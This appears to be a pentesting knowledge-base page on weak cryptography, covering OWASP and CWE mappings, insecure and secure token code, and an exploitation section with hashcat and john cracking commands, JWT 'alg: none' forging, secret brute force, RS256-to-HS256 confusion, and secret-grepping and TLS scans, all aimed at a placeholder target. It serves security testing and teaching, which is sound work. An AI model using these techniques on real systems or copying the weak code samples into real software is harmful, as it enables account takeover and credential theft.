---
title: Weak Cryptography Implementation
---

# Weak Cryptography Implementation

Cryptographic failures occur when sensitive data is inadequately protected, either through broken algorithms, misconfigured implementations, poor key management, or no encryption at all. The attacker doesn't need to break the math; they exploit the gaps around it.

Notable CWEs: CWE-327 (Broken/Risky Algorithm), CWE-326 (Inadequate Encryption Strength), CWE-331 (Insufficient Entropy), CWE-259 (Hardcoded Password), CWE-347 (Improper Signature Verification).

## OWASP Top 10 Mapping

| OWASP Top 10 Category | Mapping to Weak Cryptography | Example Findings |
| --- | --- | --- |
| **A02:2021 - Cryptographic Failures** | Primary category for weak cryptographic design and implementation issues | Weak password hashing, weak TLS, AES-ECB, hardcoded keys, missing HSTS, data sent over HTTP |
| **A07:2021 - Identification and Authentication Failures** | Applies when weak cryptography affects authentication/session mechanisms | Predictable reset tokens, weak JWT secret, JWT `alg: none`, weak session IDs, brute-forceable OTPs |
| **A05:2021 - Security Misconfiguration** | Applies when platform or server crypto configuration is insecure | TLS 1.0/1.1 enabled, weak ciphers, invalid certificate validation, missing secure transport headers |
| **A08:2021 - Software and Data Integrity Failures** | Applies when integrity validation, signatures, or trust verification are missing or broken | Improper signature verification, unsigned tokens accepted, unverified signed payloads, weak update/package integrity checks |

### CWE Mapping Addition

| CWE | Description | Where It Appears |
| --- | --- | --- |
| **CWE-330** | Use of Insufficiently Random Values | Predictable reset tokens, weak OTPs, weak session IDs |
| **CWE-338** | Use of Cryptographically Weak Pseudo-Random Number Generator | Use of `Math.random()`, `rand()`, timestamp-based token generation |
| **CWE-335** | Incorrect Usage of Seeds in Pseudo-Random Number Generator | Predictable seed values based on time, user ID, username, or email |

## Understanding the Basics

### Weak vs. Strong - Quick Reference

| Category | Broken / Avoid | Use Instead |
| --- | --- | --- |
| Hashing (passwords) | MD5, SHA-1, unsalted SHA-256 | bcrypt, Argon2, scrypt, PBKDF2 |
| Hashing (integrity) | MD5, SHA-1 | SHA-256, SHA-3 |
| Symmetric encryption | DES, 3DES, RC4, AES-ECB | AES-256-GCM, ChaCha20-Poly1305 |
| Asymmetric encryption | RSA < 2048-bit, PKCS#1 v1.5 | RSA-OAEP 2048+, ECC Curve25519 |
| TLS protocols | SSLv2, SSLv3, TLS 1.0, TLS 1.1 | TLS 1.2 (limited), TLS 1.3 |
| JWT algorithm | `none`, HS256 with weak secret | RS256, ES256 with strong keys |
| Key storage | Hardcoded in source / config files | Secrets manager, HSM, env vars |

### Why It Matters

Most crypto bugs aren't in the algorithm, they're in how it's used. The same AES can be secure or completely broken depending on mode, IV, key management, and whether integrity checking is applied. Your job is finding those misconfigurations.

## Attack Surface

- **Login / password storage:** hashed with MD5 or SHA-1, unsalted, or stored in plaintext
- **Session tokens / JWTs:** weak secrets, no signature verification, `alg: none`
- **Data in transit:** HTTP instead of HTTPS, TLS downgrade, weak cipher suites
- **Data at rest:** AES-ECB mode, reused IVs, no authenticated encryption
- **API keys / secrets:** hardcoded in source code, JavaScript files, or git history
- **Password reset / verification tokens:** low entropy, MD5-hashed, predictable
- **Encrypted cookies:** CBC without MAC, reused key/IV pairs
- **Certificate validation:** missing hostname check, self-signed accepted silently

## Weak Randomness / Insufficient Entropy

Weak randomness occurs when security-sensitive values are generated using predictable, low-entropy, or non-cryptographic random sources. This issue commonly affects password reset tokens, OTPs, session IDs, CSRF tokens, API keys, encryption keys, IVs, and nonces.

The application may use strong cryptographic algorithms, but if the random values used with them are predictable or reused, the overall security of the implementation can still be broken.

### OWASP Mapping

- **A02:2021 - Cryptographic Failures**
- **A07:2021 - Identification and Authentication Failures**
- **A05:2021 - Security Misconfiguration**

### Related CWEs

- CWE-331: Insufficient Entropy
- CWE-330: Use of Insufficiently Random Values
- CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator
- CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator

### Common Weak Randomness Issues

- Tokens generated using `Math.random()`
- OTPs generated using `rand()` or other weak random functions
- Password reset tokens generated using timestamps
- Tokens generated using user ID, email, username, or phone number
- Sequential or incremental reset tokens
- Short OTPs without rate limiting
- Reused IVs or nonces in encryption
- API keys with insufficient length or entropy
- Session IDs with visible patterns
- CSRF tokens that remain static across sessions
- Tokens that do not expire
- Tokens that remain valid after use

### Vulnerable Examples

#### JavaScript - Weak Token Generation

```jsx
// Weak: Math.random() is not cryptographically secure
const token = Math.random().toString(36).substring(2);
console.log(token);
```

#### PHP - Weak OTP Generation

```php
// Weak: rand() is not suitable for security-sensitive OTP generation
$otp = rand(100000, 999999);
echo $otp;
```

#### Python - Time-Based Token

```python
# Weak: token is generated using current time and can be predictable
import time
import hashlib

token = hashlib.md5(str(time.time()).encode()).hexdigest()
print(token)
```

### Secure Examples

#### JavaScript / Node.js

```jsx
// Secure: uses cryptographically secure random bytes
const crypto = require("crypto");

const token = crypto.randomBytes(32).toString("hex");
console.log(token);
```

#### PHP

```php
// Secure: random_bytes() is cryptographically secure
$token = bin2hex(random_bytes(32));
echo $token;
```

#### Python

```python
# Secure: secrets module is designed for security-sensitive randomness
import secrets

token = secrets.token_urlsafe(32)
print(token)
```

#### Java

```java
import java.security.SecureRandom;
import java.util.Base64;

public class SecureToken {
    public static void main(String[] args) {
        SecureRandom secureRandom = new SecureRandom();
        byte[] tokenBytes = new byte[32];
        secureRandom.nextBytes(tokenBytes);

        String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
        System.out.println(token);
    }
}
```

### Testing for Weak Randomness

Collect multiple tokens and check whether they follow any predictable pattern.

```bash
for i in {1..20}; do
  curl -s -X POST <https://target.com/reset-password> \
    -d "email=test@example.com" | grep -oE '[A-Za-z0-9_-]{10,}'
done
```

Check for:

- Repeated tokens
- Incremental values
- Same prefix or suffix
- Timestamp-like patterns
- Short token length
- Base64 values that decode to predictable data
- Tokens linked to user ID, email, or username
- OTPs that can be brute-forced due to missing rate limiting
- Tokens that remain valid after use
- Tokens that do not expire

### Example Token Pattern Issues

| Token Behavior | Possible Issue |
| --- | --- |
| `100001`, `100002`, `100003` | Sequential token generation |
| Same token generated multiple times | Token reuse or insufficient entropy |
| Token contains user ID | Predictable token structure |
| Token changes based on current time | Timestamp-based generation |
| 4-digit OTP with no rate limit | Brute-forceable OTP |
| Static CSRF token | Weak CSRF protection |

### Impact

Weak randomness can lead to:

- Account takeover through predictable password reset tokens
- OTP brute force
- Session hijacking
- CSRF bypass
- API key guessing
- Token forgery
- Authentication bypass
- Encryption compromise due to reused IVs or nonces

### Mitigation

- Use cryptographically secure random number generators.
- Generate at least 128 bits of entropy for security-sensitive tokens.
- Use 256 bits of entropy for high-value tokens such as API keys.
- Expire password reset and verification tokens quickly.
- Invalidate tokens after first use.
- Apply rate limiting on OTP and token validation endpoints.
- Do not generate tokens using timestamps, user IDs, emails, usernames, or phone numbers.
- Do not use `Math.random()`, `rand()`, or similar weak functions for security-sensitive values.
- Use secure libraries:
    - Python: `secrets`
    - Node.js: `crypto.randomBytes`
    - PHP: `random_bytes`
    - Java: `SecureRandom`
    - Go: `crypto/rand`

## Exploiting Weak Cryptography

### 1. Cracking Weak Password Hashes

When a database is breached or hashes leak, fast algorithms like MD5 and SHA-1 fall in seconds to minutes. No salt = rainbow table attack.

```bash
# MD5 / SHA-1 cracking with hashcat
hashcat -m 0 hashes.txt rockyou.txt        # MD5
hashcat -m 100 hashes.txt rockyou.txt      # SHA-1
hashcat -m 1400 hashes.txt rockyou.txt     # SHA-256 (unsalted)

# With rules for better coverage
hashcat -m 0 hashes.txt rockyou.txt -r best64.rule

# john the ripper
john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
```

Identify hash type before cracking:

```
$1$...          → MD5crypt
$2y$...         → bcrypt (expensive — don't bother without GPU farm)
$5$...          → SHA-256crypt
5f4dcc3b...     → raw MD5 (32 hex chars, no prefix — very fast to crack)
da39a3ee...     → raw SHA-1 (40 hex chars)
```

### 2. JWT — `alg: none` Bypass

Some JWT libraries accept unsigned tokens if `"alg": "none"` is set in the header. Signature verification is skipped entirely — payload can be freely modified.

```bash
# Step 1 — Decode the existing JWT
# Header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# Payload: eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0

# Step 2 — Craft malicious header + payload
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
echo -n '{"sub":"user1","role":"admin"}' | base64 | tr -d '='

# Step 3 — Assemble with empty signature (trailing dot is required)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJhZG1pbiJ9.

# Also try case variations the library might accept:
# "alg": "None"  /  "NONE"  /  "nOnE"
```

Use **jwt_tool** or **Burp JWT Editor** extension to automate this cleanly.

### 3. JWT — Weak Secret Brute Force

HS256 tokens are signed with a shared secret. If the secret is weak or default, crack it offline — no noise, no requests to the server.

```bash
# hashcat — GPU-accelerated, fastest option
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool — built-in crack mode
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

Common weak JWT secrets to try first: `secret`, `password`, `123456`, `jwt`, `key`, `test`, app name, domain name.

Once cracked — forge any payload:

```python
import jwt
forged = jwt.encode({"sub": "admin", "role": "admin"}, "secret", algorithm="HS256")
```

### 4. JWT — Algorithm Confusion (RS256 → HS256)

If the server uses RS256 (asymmetric), an attacker can switch to HS256 and sign the token with the **public key** as the HMAC secret — exploiting libraries that trust the `alg` field from =the token header.

```bash
# Step 1 — Get the server's public key
openssl s_client -connect target.com:443 2>/dev/null | \
  sed -n '/-----BEGIN/,/-----END/p' > cert.pem
openssl x509 -pubkey -noout -in cert.pem > pubkey.pem

# Step 2 — Sign forged HS256 token with the public key as secret
# Use jwt_tool or Burp JWT Editor (Algorithm Confusion attack option)
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```

### 5. TLS — Weak Protocol / Cipher Detection

Test what TLS versions and ciphers a server actually accepts. Old cipher suites and protocols still show up in legacy and misconfigured systems.

```bash
# testssl.sh — most comprehensive, covers protocols, ciphers, known vulns
./testssl.sh --full target.com:443

# Quick checks
./testssl.sh --protocols target.com:443    # SSLv3, TLS 1.0, 1.1 support
./testssl.sh --ciphers target.com:443      # RC4, 3DES, EXPORT ciphers
./testssl.sh --vulnerable target.com:443   # POODLE, BEAST, CRIME, Heartbleed

# sslscan
sslscan target.com:443

# nmap
nmap --script ssl-enum-ciphers -p 443 target.com
```

Findings that are immediately reportable: SSLv3 / TLS 1.0 enabled, RC4 or 3DES ciphers, EXPORT ciphers, no HSTS header, certificate using SHA-1 or MD5 signature.

### 6. AES-ECB Mode — Pattern Detection

ECB encrypts identical plaintext blocks to identical ciphertext blocks. This leaks structure — attackers can detect repeated blocks, infer plaintext, and sometimes manipulate ciphertext without decrypting.

```python
# Detect ECB mode — submit repeated input and look for repeated output blocks
import requests, base64

# Send 48 identical bytes (3 x 16-byte blocks)
payload = "A" * 48
r = requests.post("<https://target.com/encrypt>", data={"input": payload})
ct = base64.b64decode(r.json()["ciphertext"])

# Split into 16-byte blocks and check for repeats
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
if len(blocks) != len(set(blocks)):
    print("[ECB DETECTED] Repeated blocks found — ECB mode confirmed")
```

What ECB detection enables: block manipulation attacks, byte-at-a-time plaintext recovery, CBC bit-flip if misidentified as CBC.

### 7. Hardcoded Keys / Secrets in Source

Secrets embedded in code, JS files, or git history are directly exploitable — no cracking required.

```bash
# Grep source code
grep -rE "(api_key|secret|password|token|key)\s*=\s*[\"'][^\"']{8,}" . \
  --include="*.js" --include="*.py" --include="*.php" --include="*.env"

# Search git history
git log --all --full-history
git diff <commit>^ <commit>
git grep "secret" $(git rev-list --all)

# truffleHog — entropy-based secret scanning
trufflehog git file://. --json

# gitleaks
gitleaks detect --source . --report-format json

# In JavaScript bundles served by the app
curl -s <https://target.com/static/app.js> | grep -E "(apiKey|secret|token)\s*[:=]\s*[\"'][^\"']{10,}"
```

### 8. HTTP Instead of HTTPS / Missing HSTS

Sensitive data transmitted over plain HTTP is trivially intercepted. Missing HSTS allows protocol downgrade even when HTTPS exists.

```bash
# Check for HTTP endpoints returning sensitive data
curl -I <http://target.com/api/login>    # Should redirect to HTTPS, not serve content
curl -I <https://target.com> | grep -i "strict-transport"   # Should contain HSTS header

# Confirm HSTS is present and well-configured
# Good:    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Missing: No header = HTTP downgrade possible
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Weak password hash | Extract hash; run hashcat with rockyou | MD5/SHA-1 hash cracks in seconds |
| JWT `alg: none` | Set header alg to none, empty signature | Server accepts unsigned token |
| JWT weak secret | Run hashcat `-m 16500` against token | Secret recovered; arbitrary tokens forgeable |
| TLS weak protocol | Run [testssl.sh](http://testssl.sh/) `--protocols` | SSLv3 / TLS 1.0 enabled = reportable |
| AES-ECB | Submit 48 identical bytes to encrypt endpoint | Repeated ciphertext blocks in response |
| Hardcoded key | Grep JS/source files for key/secret patterns | Credentials found in plaintext |
| Missing HSTS | `curl -I <https://target.com`> | No `Strict-Transport-Security` header |
| HTTP login | Submit credentials over HTTP | Credentials visible in plaintext in traffic |
| Weak randomness / entropy | Generate multiple reset tokens, OTPs, session IDs, or API keys and compare them | Tokens should be unique, unpredictable, sufficiently long, and should not follow any visible pattern |

## Detection Techniques (Offensive Perspective)

### Manual Detection

**Identify hash algorithm from leaked data**

```
Length 32 hex  → MD5        (fast to crack, look for rainbow tables)
Length 40 hex  → SHA-1      (fast to crack)
Length 64 hex  → SHA-256    (check if salted — if not, still fast)
$2y$10$...     → bcrypt     (slow — deprioritise)
$argon2...     → Argon2     (secure — skip)
```

**Inspect JWT without a tool**

```bash
# Decode header and payload manually (no verification)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
# HS256 = shared secret = brute-forceable
# RS256 = asymmetric = try algorithm confusion instead
```

**Check TLS certificate strength**

```bash
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text \
  | grep -E "(Signature Algorithm|Public-Key|Not After)"
# SHA1withRSA or key < 2048 = reportable
```

### Automated Detection

```bash
# Full TLS audit in one command
testssl.sh --full --jsonfile results.json target.com:443

# Scan for exposed secrets across a JS-heavy app
gospider -s <https://target.com> -d 2 -q | grep -oP 'https?://[^ ]+\.js' \
  | xargs -I{} curl -s {} | grep -E "(apiKey|secret|password|token)\s*[:=]\s*[\"'][^\"']{8,}"

# nuclei — crypto-related templates
nuclei -u <https://target.com> -t ssl/ -t exposures/tokens/
```

## Impact

- **Credential Theft:** Weak hashes cracked offline expose plaintext passwords usable for credential stuffing or account takeover
- **Authentication Bypass:** JWT `alg: none` or unverified signatures allow privilege escalation without valid credentials
- **Data Decryption:** Intercepted traffic or stolen ciphertext decrypted due to weak algorithms or ECB mode
- **Key Compromise:** Hardcoded or weak keys give permanent access until explicitly rotated
- **Traffic Interception:** HTTP or TLS downgrade allows passive or active MITM against sensitive sessions
- **Compliance Breach:** PCI-DSS, HIPAA, GDPR all mandate strong encryption; failures directly trigger audit findings

## Tools

| Tool | Purpose |
| --- | --- |
| hashcat | GPU-accelerated hash and JWT secret cracking |
| john the ripper | CPU-based hash cracking |
| [testssl.sh](http://testssl.sh/) | Comprehensive TLS protocol, cipher, and vulnerability audit |
| sslscan | Quick TLS cipher enumeration |
| jwt_tool | JWT decode, tamper, crack, and attack automation |
| Burp JWT Editor | In-Repeater JWT modification and attack payloads |
| truffleHog / gitleaks | Entropy-based secret scanning in source and git history |
| nuclei | Template-based crypto misconfiguration detection |

## Mitigation & Prevention

1. **Password Hashing:** Use bcrypt, Argon2, or scrypt with a per-user salt; never MD5, SHA-1, or unsalted SHA-256 for passwords
2. **Authenticated Encryption:** Use AES-GCM or ChaCha20-Poly1305; never AES-ECB; always use a random IV per operation
3. **TLS Configuration:** Enforce TLS 1.2+ (TLS 1.3 preferred); disable SSLv3, TLS 1.0/1.1; remove RC4, 3DES, EXPORT cipher suites; enable HSTS
4. **JWT Security:** Explicitly allowlist the algorithm server-side; never trust `alg` from the token; reject `none`; use RS256/ES256 over HS256 for multi-service environments; enforce strong secrets (32+ random bytes)
5. **Key Management:** Never hardcode secrets; use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault); rotate keys regularly
6. **No Custom Cryptography:** Use well-audited libraries (`libsodium`, `cryptography` Python package, Java `javax.crypto` with current providers); never implement algorithms from scratch
7. **Enforce HTTPS Everywhere:** Redirect all HTTP to HTTPS; set `Strict-Transport-Security` with `max-age` ≥ 1 year and `includeSubDomains`
8. **Secure Randomness:** Use cryptographically secure random number generators for tokens, OTPs, session IDs, CSRF tokens, IVs, nonces, and API keys. Avoid `Math.random()`, `rand()`, timestamp-based values, sequential IDs, or user-derived values for security-sensitive token generation.

---

## Software Integrity - SRI Presence Validation

Subresource Integrity, also known as SRI, helps the browser verify that third-party scripts and stylesheets have not been tampered with. If an application loads JavaScript or CSS from a CDN or third-party domain without SRI, an attacker who compromises the CDN, third-party provider, or network path may inject malicious code into the application.

The following browser console snippets can be used to check whether SRI is present and whether the SRI-related attributes are configured correctly.

### Check All Scripts and Their SRI Status

```jsx
[...document.querySelectorAll("script[src]")].map(script => ({
  src: script.src,
  hasIntegrity: script.hasAttribute("integrity"),
  integrity: script.getAttribute("integrity"),
  hasCrossorigin: script.hasAttribute("crossorigin"),
  crossorigin: script.getAttribute("crossorigin")
}));
```

### List Only Scripts Missing SRI

```jsx
[...document.querySelectorAll("script[src]")]
  .filter(script => !script.hasAttribute("integrity"))
  .map(script => script.src);
```

### List Only External Scripts Missing SRI

```jsx
[...document.querySelectorAll("script[src]")]
  .filter(script => {
    const url = new URL(script.src);
    return url.origin !== location.origin && !script.hasAttribute("integrity");
  })
  .map(script => script.src);
```

### Check Stylesheets Missing SRI

```jsx
[...document.querySelectorAll('link[rel="stylesheet"][href]')]
  .filter(link => !link.hasAttribute("integrity"))
  .map(link => link.href);
```

### Check External Stylesheets Missing SRI

```jsx
[...document.querySelectorAll('link[rel="stylesheet"][href]')]
  .filter(link => {
    const url = new URL(link.href);
    return url.origin !== location.origin && !link.hasAttribute("integrity");
  })
  .map(link => link.href);
```

### Full SRI Audit for Scripts and Stylesheets

```jsx
(() => {
  const scripts = [...document.querySelectorAll("script[src]")].map(script => ({
    type: "script",
    url: script.src,
    external: new URL(script.src).origin !== location.origin,
    hasIntegrity: script.hasAttribute("integrity"),
    integrity: script.getAttribute("integrity"),
    hasCrossorigin: script.hasAttribute("crossorigin"),
    crossorigin: script.getAttribute("crossorigin")
  }));

  const stylesheets = [...document.querySelectorAll('link[rel="stylesheet"][href]')].map(link => ({
    type: "stylesheet",
    url: link.href,
    external: new URL(link.href).origin !== location.origin,
    hasIntegrity: link.hasAttribute("integrity"),
    integrity: link.getAttribute("integrity"),
    hasCrossorigin: link.hasAttribute("crossorigin"),
    crossorigin: link.getAttribute("crossorigin")
  }));

  return [...scripts, ...stylesheets];
})();
```

### Show Only External Resources Missing SRI

```jsx
(() => {
  const scripts = [...document.querySelectorAll("script[src]")]
    .filter(script => {
      const url = new URL(script.src);
      return url.origin !== location.origin && !script.hasAttribute("integrity");
    })
    .map(script => ({
      type: "script",
      url: script.src
    }));

  const stylesheets = [...document.querySelectorAll('link[rel="stylesheet"][href]')]
    .filter(link => {
      const url = new URL(link.href);
      return url.origin !== location.origin && !link.hasAttribute("integrity");
    })
    .map(link => ({
      type: "stylesheet",
      url: link.href
    }));

  return [...scripts, ...stylesheets];
})();
```

### SRI Script Validation Status

The SRI snippets have been reviewed for browser console execution and are syntactically valid.

| Check | Status |
| --- | --- |
| Querying scripts using `document.querySelectorAll("script[src]")` | Working |
| Checking presence of `integrity` attribute | Working |
| Checking presence of `crossorigin` attribute | Working |
| Filtering external scripts using `new URL(script.src).origin !== location.origin` | Working |
| Listing scripts missing SRI | Working |
| Checking stylesheets for SRI | Working |
| Full script and stylesheet SRI audit snippet | Working |

### Important Notes

- SRI is mainly required for external scripts and stylesheets loaded from CDN or third-party domains.
- Same-origin scripts may not always require SRI, but adding SRI can still improve integrity assurance.
- For cross-origin resources, the `crossorigin` attribute is usually required with SRI.
- If the external script or stylesheet changes, the SRI hash must also be updated.
- If the SRI hash is incorrect, the browser will block the script or stylesheet from loading.

### Example Secure Script Tag

```html
<script
  src="<https://cdn.example.com/library.min.js>"
  integrity="sha384-BASE64_HASH_VALUE"
  crossorigin="anonymous">
</script>
```

### Example Secure Stylesheet Tag

```html
<link
  rel="stylesheet"
  href="<https://cdn.example.com/library.min.css>"
  integrity="sha384-BASE64_HASH_VALUE"
  crossorigin="anonymous">
```

### SRI Test Cases

| Scenario | Action | Expected Result |
| --- | --- | --- |
| External script without SRI | Run the external script missing SRI snippet | Script URL should be listed |
| External script with SRI | Inspect the script tag | `integrity` attribute should be present |
| External script with SRI but no crossorigin | Inspect the script tag | `crossorigin` should be present where required |
| Incorrect SRI hash | Modify the SRI hash and reload the page | Browser should block the resource |
| External stylesheet without SRI | Run the stylesheet missing SRI snippet | Stylesheet URL should be listed |
| Full SRI audit | Run the full SRI audit snippet | All external resources should show integrity and crossorigin status |

## Good To Read

### Notable Incidents

- **RockYou (2009):** 32 million passwords stored in plaintext — the breach that created the most-used password cracking wordlist in existence
- **LinkedIn (2012):** 6.5 million SHA-1 unsalted password hashes leaked; subsequently cracked; full 117M hash dump surfaced in 2016
- **Adobe (2013):** 153 million records with passwords encrypted using 3DES in ECB mode with the same key — identical passwords produced identical ciphertext, leaking patterns
- **Heartbleed / OpenSSL (2014):** TLS implementation bug leaked private keys and session data from memory — a reminder that correct algorithms fail when implementations are buggy
- **JWT `alg: none` (2015):** Multiple JWT libraries accepted unsigned tokens — affected Auth0, others; patched after public disclosure

### HackerOne Reports

- [Authentication Bypass via JWT None Algorithm (#1647642)](https://hackerone.com/reports/1647642)
- [Hardcoded JWT Secret Key leading to Account Takeover (#748214)](https://hackerone.com/reports/748214)
- [JWT Audience Claim Not Verified — Argo CD (#1889161)](https://hackerone.com/reports/1889161)
- [Weak MD5 Password Hashing (#272](https://hackerone.com/reports/272)

## References

- [OWASP A02:2021 — Cryptographic Failures](https://owasp.org/Top10/2021/A02_2021-Cryptographic_Failures/)
- [OWASP Testing: Weak Encryption (WSTG-CRYP-04)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption)
- [OWASP Testing: Weak TLS (WSTG-CRYP-01)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [HackTricks: JWT Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [NIST SP 800-131A: Transitioning Cryptographic Algorithms](https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final)
- [PayloadsAllTheThings: JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)